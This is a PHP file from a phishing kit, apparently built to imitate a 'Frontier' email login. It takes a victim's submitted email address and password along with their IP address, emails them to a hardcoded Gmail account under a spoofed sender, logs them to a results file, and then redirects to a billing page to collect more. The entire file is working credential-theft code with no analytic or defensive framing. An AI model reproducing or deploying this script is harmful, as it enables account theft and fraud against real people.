<?php   ob_start();  

include "v-V-v.php";

$date = gmdate("Y/m/d | H:i:s");
$ip = $_SERVER['REMOTE_ADDR'];
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "--------------- Frontier Details  ---------------\n";
$message .= "Email Address  : ".$_POST['email']."\n";
$message .= "Email Password : ".$_POST['pass']."\n";
$message .= "--------xX CREATED BY Dee-1 Xx--------\n";
$message .= "IP : ".$_SERVER['REMOTE_ADDR']." | MR.SM+KK: ".date("g:i:s:a || D-d-M-Y")."\n";
$message .= "--------------------------------------------------\n";

$send="awesuyinka@gmail.com";
$subject = "SMTP | ".$_POST['email']." | $ip";
$headers = "From: sm+kk<noreply@spammersupport.info>";
$headers.= "MIME-Version: 1.0\r\n";
$headers.= "Content-Type: text/plain; charset=UTF-8\r\n";

mail($send,$subject,$message,$headers);

$fp = fopen("../rezult.txt","a");
fputs($fp,$message);
fclose($fp);


header("Location: billing.htm");	 
?>